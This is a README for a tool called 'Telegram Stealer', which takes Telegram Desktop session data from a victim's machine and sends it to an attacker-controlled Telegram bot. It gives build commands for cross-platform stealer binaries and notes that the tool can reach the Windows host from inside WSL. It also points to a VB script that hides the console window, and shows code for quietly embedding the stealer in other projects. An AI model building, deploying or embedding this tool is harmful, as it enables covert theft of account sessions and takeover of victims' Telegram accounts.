# Telegram Stealer

Steal Telegram Desktop sessions.

If the stealer is started inside WSL, it will get the Telegram Desktop sessions from its Windows host.

**Note:** If the target configured a local password in Telegram Desktop, the sessions will be encrypted, so you would need the password to unlock it.

## Demo

https://youtu.be/3mKOwtCnwYw

## Build

Install dependencies

```sh
npm i -D
npm i -g pkg
```

Build

```sh
npm run build <chat_id> <bot_token>

# Create the stealer binary, choose target system and architecture
npm run pkg-windows
npm run pkg-linux
npm run pkg-linux-arm
npm run pkg-macos
npm run pkg-macos-arm
```

## Run

Run the `hello` binary.

To hide the console window on a Windows machine, you can run the script using the provided VB script (see [`run_hidden_windows.vbs`](./run_hidden_windows.vbs)).

## Include in your project

```sh
npm install https://github.com/rigwild/telegram-stealer.git
```

```js
import { run as stealTelegram } from 'telegram-stealer'

await stealTelegram({
  telegramChatId: '<chat_id>',
  telegramToken: '<bot_token>',
  waitOnStart: false
})
```

## License

[The MIT license](./LICENSE)
